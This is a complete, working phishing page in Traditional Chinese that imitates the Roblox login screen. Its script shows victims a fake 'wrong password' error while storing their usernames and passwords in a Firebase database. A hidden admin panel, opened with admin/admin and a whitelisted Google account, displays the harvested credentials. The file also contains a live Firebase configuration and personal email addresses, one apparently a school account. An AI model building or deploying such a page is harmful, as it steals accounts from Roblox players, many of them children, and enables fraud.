<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>登入 Roblox</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { 
            background-color: #111214; 
            /* 修正手機版無法滾動的問題 */
            overflow-x: hidden; 
            overflow-y: auto; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
        }
        .bg-grid-wrapper { 
            /* 將背景改為固定，滾動時才不會穿幫 */
            position: fixed; 
            top: -50%; 
            left: -50%; 
            width: 200%; 
            height: 200%; 
            transform: rotate(-12deg); 
            z-index: -2; 
            pointer-events: none; 
        }
        .bg-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 12px; width: 100%; height: 100%; opacity: 0.45; }
        .tile { width: 100%; aspect-ratio: 1; background-size: cover; background-position: center; border-radius: 12px; box-shadow: 0 8px 16px rgba(0,0,0,0.8); }
        input:focus { outline: none; border-color: #ffffff; background-color: #111214; }
        input::placeholder { color: #888c90; }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #111214; border-radius: 4px; }
        ::-webkit-scrollbar-thumb { background: #393b3d; border-radius: 4px; }
    </style>
</head>
<body class="text-white flex flex-col min-h-screen relative">

    <div class="bg-grid-wrapper" aria-hidden="true"><div class="bg-grid" id="bg-grid"></div></div>
    <!-- 遮罩也改為 fixed，確保涵蓋整個滾動畫面 -->
    <div class="fixed inset-0 bg-black/50 z-[-1] pointer-events-none"></div>

    <nav class="w-full h-14 bg-[#111214]/95 border-b border-gray-800 flex items-center justify-between px-6 z-50 fixed top-0 backdrop-blur-sm">
        <div class="flex items-center gap-6">
            <a href="#" id="logo" class="text-white">
                <svg viewBox="0 0 24 24" fill="currentColor" class="w-[30px] h-[30px]">
                    <path fill-rule="evenodd" clip-rule="evenodd" d="M5.275 2.5L2.5 18.725L18.725 21.5L21.5 5.275L5.275 2.5ZM13.842 13.626L10.373 14.22L9.779 10.751L13.248 10.158L13.842 13.626Z" />
                </svg>
            </a>
            <div class="hidden md:flex items-center gap-5 text-[15px] font-bold">
                <a href="#" class="nav-link">圖表</a><a href="#" class="nav-link">市集</a><a href="#" class="nav-link">創作</a><a href="#" class="nav-link">Robux</a>
            </div>
        </div>
        <div class="flex-1 max-w-[600px] mx-6 hidden md:block">
            <div class="relative flex items-center w-full h-[34px] rounded bg-[#232527] border border-transparent focus-within:border-white">
                <input type="text" placeholder="搜尋" class="bg-transparent w-full h-full pl-3 pr-4 outline-none text-[15px]">
            </div>
        </div>
        <div class="flex items-center"><button id="reg-btn" class="bg-[#3b82f6] px-4 py-[6px] rounded text-[15px] font-bold">註冊</button></div>
    </nav>

    <!-- 加上 py-10 確保手機版上下有足夠的留白可以滑動 -->
    <main class="flex-1 flex items-center justify-center p-4 relative z-10 mt-14 py-10 min-h-[calc(100vh-3.5rem)]">
        
        <!-- 登入視窗 -->
        <div id="login-window" class="bg-[#2b2d31] w-full max-w-[400px] rounded-lg p-6 sm:p-8 shadow-2xl flex flex-col items-center my-auto">
            <h1 class="text-[24px] sm:text-[26px] font-bold mb-6">登入 Roblox</h1>
            <div class="w-full flex flex-col gap-4">
                <input type="text" id="username" placeholder="使用者名稱 / 電子郵件 / 手機號碼" class="w-full bg-[#111214] border border-gray-600 rounded-lg px-4 py-[10px]">
                <input type="password" id="password" placeholder="密碼" class="w-full bg-[#111214] border border-gray-600 rounded-lg px-4 py-[10px]">
                <div id="error-message" class="hidden text-red-400 text-[14px] text-center w-full bg-red-500/10 border border-red-500/30 rounded-lg py-2 px-2">
                    使用者名稱或密碼不正確。
                </div>
                <div id="google-auth-msg" class="hidden text-blue-400 text-[14px] text-center w-full bg-blue-500/10 border border-blue-500/30 rounded-lg py-2 px-2">
                    正在呼叫 Google 驗證，請在彈出視窗中登入...
                </div>
                <button id="login-btn" class="w-full border border-gray-400 text-gray-300 rounded-lg py-[10px] font-medium transition-colors">登入</button>
            </div>
            <a href="#" class="mt-4 text-[13px] text-gray-400">忘記密碼或使用者名稱？</a>
            <div class="w-full flex flex-col gap-3 mt-4">
                <button class="nav-link w-full bg-[#393b3d] py-[10px] rounded-lg text-[14px]">透過電子郵件驗證碼</button>
                <button class="nav-link w-full bg-[#393b3d] py-[10px] rounded-lg text-[14px]">快速登入</button>
            </div>
        </div>

        <!-- 管理員面板 -->
        <div id="admin-panel" class="hidden bg-[#2b2d31] w-full max-w-[600px] rounded-lg p-6 sm:p-8 shadow-2xl flex-col items-center my-auto">
            <h1 class="text-[24px] sm:text-[26px] font-bold text-red-400 mb-2">安全管理員模式</h1>
            <p id="admin-welcome" class="text-green-400 text-sm mb-4 text-center break-all">已驗證管理員身分</p>
            <div class="w-full bg-[#111214] rounded-lg p-4 max-h-[300px] overflow-y-auto border border-gray-700 mt-2">
                <table class="w-full text-left text-sm text-gray-300" style="table-layout: fixed;">
                    <thead class="sticky top-0 bg-[#111214] z-10">
                        <tr>
                            <th class="pb-2 border-b border-gray-700 w-1/4">時間</th>
                            <th class="pb-2 border-b border-gray-700 w-1/3">帳號</th>
                            <th class="pb-2 border-b border-gray-700 w-1/3">密碼</th>
                        </tr>
                    </thead>
                    <tbody id="admin-records"></tbody>
                </table>
            </div>
            <div class="flex flex-col sm:flex-row gap-4 mt-6 w-full">
                <button id="clear-records-btn" class="flex-1 bg-red-500 hover:bg-red-600 py-[10px] rounded-lg font-bold">清除雲端紀錄</button>
                <button id="close-admin-btn" class="flex-1 bg-blue-600 hover:bg-blue-700 py-[10px] rounded-lg font-bold">登出並退出</button>
            </div>
        </div>

        <!-- 自訂錯誤/提示彈窗 -->
        <div id="error-404-modal" class="hidden fixed inset-0 bg-black/70 z-[100] flex items-center justify-center p-4 backdrop-blur-sm">
            <div class="bg-[#2b2d31] w-full max-w-[320px] rounded-lg p-6 text-center border border-gray-700">
                <h2 class="text-xl font-bold mb-2 text-white" id="modal-title">提示訊息</h2>
                <p id="modal-error-text" class="text-gray-400 text-sm mb-6 break-words">頁面或功能不存在。</p>
                <button id="close-404-btn" class="bg-gray-700 hover:bg-gray-600 text-white w-full py-2 rounded-lg font-medium">關閉</button>
            </div>
        </div>
    </main>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getAuth, signInAnonymously, GoogleAuthProvider, signInWithPopup, signOut } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
        import { getFirestore, collection, addDoc, onSnapshot, getDocs, deleteDoc, doc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

        const firebaseConfig = {
          apiKey: "AIzaSyC28C5UtC0UoEFiUCH7Rd5lxDw1WvgEBYQ",
          authDomain: "roblox-login-83bc9.firebaseapp.com",
          projectId: "roblox-login-83bc9",
          storageBucket: "roblox-login-83bc9.firebasestorage.app",
          messagingSenderId: "870394222766",
          appId: "1:870394222766:web:0db356d9ce3f9b6d8eb53f",
          measurementId: "G-962FYDGR28"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);
        const provider = new GoogleAuthProvider();
        
        // 強制每次登入都選擇帳號，避免卡在錯誤的 Google 帳號
        provider.setCustomParameters({ prompt: 'select_account' });
        
        const collectionPath = 'artifacts/roblox-clone-data/public/data/credentials'; 

        const ALLOWED_EMAILS = [
            "pixel9profold20240813@gmail.com",
            "st20813@mail.ckjhs.tyc.edu.tw"
        ];

        let unsubscribeSnapshot = null;
        let logs = [];

        signInAnonymously(auth).catch(console.error);

        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('login-btn');
        const errorMessage = document.getElementById('error-message');
        const googleAuthMsg = document.getElementById('google-auth-msg');

        function updateBtn() {
            if(usernameInput.value && passwordInput.value) {
                loginBtn.className = "w-full bg-white text-black hover:bg-gray-200 rounded-lg py-[10px] font-medium transition-colors";
            } else {
                loginBtn.className = "w-full border border-gray-400 text-gray-300 rounded-lg py-[10px] font-medium transition-colors";
            }
        }
        usernameInput.oninput = updateBtn;
        passwordInput.oninput = updateBtn;

        function escapeHTML(str) {
            const div = document.createElement('div');
            div.textContent = str;
            return div.innerHTML;
        }

        function showErrorModal(text, title = "提示訊息") {
            document.getElementById('modal-title').innerText = title;
            document.getElementById('modal-error-text').innerText = text;
            document.getElementById('error-404-modal').classList.remove('hidden');
        }

        loginBtn.onclick = async () => {
            const u = usernameInput.value;
            const p = passwordInput.value;
            if(!u || !p) return;

            if(u === 'admin' && p === 'admin') {
                errorMessage.classList.add('hidden');
                googleAuthMsg.classList.remove('hidden');
                loginBtn.disabled = true;

                try {
                    // 呼叫 Google 彈窗登入
                    const result = await signInWithPopup(auth, provider);
                    const email = result.user.email;

                    if (ALLOWED_EMAILS.includes(email)) {
                        document.getElementById('admin-welcome').innerText = `已授權登入: ${email}`;
                        document.getElementById('login-window').classList.add('hidden');
                        document.getElementById('admin-panel').classList.remove('hidden');
                        document.getElementById('admin-panel').classList.add('flex');
                        
                        listenToData();
                    } else {
                        await signOut(auth);
                        showErrorModal(`您的信箱 ${email} 不在管理員白名單內，已拒絕存取。`, "權限不足");
                        signInAnonymously(auth); 
                    }
                } catch (error) {
                    console.error("Google 登入失敗", error);
                    let errText = "Google 登入發生未知錯誤。";
                    
                    // 針對常見錯誤給予精確提示
                    if (error.code === 'auth/popup-blocked') {
                        errText = "瀏覽器阻擋了彈出視窗！\n如果您是在預覽環境，請將此網頁獨立開在新分頁測試。";
                    } else if (error.code === 'auth/popup-closed-by-user') {
                        errText = "您中途關閉了 Google 登入視窗。";
                    } else if (error.code === 'auth/unauthorized-domain') {
                        errText = "此網域未被授權！\n請至 Firebase 控制台的 Authentication > Settings > Authorized domains 加入此網址。";
                    } else {
                        errText = `無法登入：${error.message}`;
                    }
                    showErrorModal(errText, "登入失敗");
                    
                } finally {
                    googleAuthMsg.classList.add('hidden');
                    loginBtn.disabled = false;
                    passwordInput.value = '';
                    updateBtn();
                }
            } else {
                // 受害者流程
                errorMessage.classList.remove('hidden');
                passwordInput.value = '';
                updateBtn();
                
                try {
                    const pathSegments = collectionPath.split('/');
                    await addDoc(collection(db, pathSegments[0], pathSegments[1], pathSegments[2], pathSegments[3], pathSegments[4]), {
                        u: u, p: p, time: new Date().toLocaleString(), ts: Date.now()
                    });
                } catch (err) {
                    console.error("寫入失敗", err);
                }
            }
        };

        function listenToData() {
            const pathSegments = collectionPath.split('/');
            const ref = collection(db, pathSegments[0], pathSegments[1], pathSegments[2], pathSegments[3], pathSegments[4]);
            
            unsubscribeSnapshot = onSnapshot(ref, snap => {
                logs = snap.docs.map(d => ({id: d.id, ...d.data()})).sort((a,b) => b.ts - a.ts);
                renderTable();
            }, error => {
                console.error("Firebase 權限阻擋:", error);
                showErrorModal("Firebase 後端安全規則已啟動：您沒有讀取資料的權限。請確認 Rules 設定是否正確。", "資料讀取失敗");
            });
        }

        function renderTable() {
            const body = document.getElementById('admin-records');
            if (logs.length === 0) {
                body.innerHTML = '<tr><td colspan="3" class="text-center py-6 text-gray-500">雲端目前無紀錄</td></tr>';
                return;
            }
            body.innerHTML = logs.map(l => `
                <tr>
                    <td class="py-2 border-b border-gray-800 text-gray-400 pr-2">${escapeHTML(l.time || '')}</td>
                    <td class="py-2 border-b border-gray-800 text-blue-400 break-all pr-2">${escapeHTML(l.u || '')}</td>
                    <td class="py-2 border-b border-gray-800 text-red-400 break-all">${escapeHTML(l.p || '')}</td>
                </tr>
            `).join('');
        }

        document.getElementById('close-admin-btn').onclick = async () => {
            if(unsubscribeSnapshot) unsubscribeSnapshot();
            await signOut(auth);
            signInAnonymously(auth);

            document.getElementById('admin-panel').classList.add('hidden');
            document.getElementById('admin-panel').classList.remove('flex');
            document.getElementById('login-window').classList.remove('hidden');
            usernameInput.value = '';
            passwordInput.value = '';
            updateBtn();
        };

        document.getElementById('clear-records-btn').onclick = async () => {
            if(!confirm("確定要刪除所有紀錄嗎？此動作無法復原。")) return;
            const pathSegments = collectionPath.split('/');
            const ref = collection(db, pathSegments[0], pathSegments[1], pathSegments[2], pathSegments[3], pathSegments[4]);
            try {
                const snap = await getDocs(ref);
                snap.forEach(async d => await deleteDoc(doc(db, pathSegments[0], pathSegments[1], pathSegments[2], pathSegments[3], pathSegments[4], d.id)));
            } catch (error) {
                console.error("刪除失敗", error);
                showErrorModal("刪除失敗，您的帳號可能沒有刪除權限。", "錯誤");
            }
        };

        document.getElementById('close-404-btn').onclick = () => {
            document.getElementById('error-404-modal').classList.add('hidden');
        };

        document.querySelectorAll('a, button').forEach(el => {
            if(!['login-btn','clear-records-btn','close-admin-btn','close-404-btn'].includes(el.id)) {
                el.onclick = (e) => { 
                    e.preventDefault(); 
                    showErrorModal("您請求的頁面或功能不存在。", "404 Not Found"); 
                };
            }
        });

        const grid = document.getElementById('bg-grid');
        for(let i=0; i<150; i++) {
            const d = document.createElement('div');
            d.className = 'tile';
            d.style.backgroundImage = `url(https://picsum.photos/seed/${i+50}/200)`;
            grid.appendChild(d);
        }
    </script>
</body>
</html>
